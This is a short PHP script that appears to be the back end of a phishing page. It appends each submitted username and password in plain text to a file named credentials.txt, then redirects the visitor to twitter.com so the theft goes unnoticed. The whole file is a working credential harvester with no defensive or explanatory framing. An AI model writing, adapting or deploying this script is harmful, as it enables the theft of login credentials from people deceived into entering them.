<?php
file_put_contents("credentials.txt", "User: " . $_POST['username'] . " | Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://twitter.com');
exit();
?>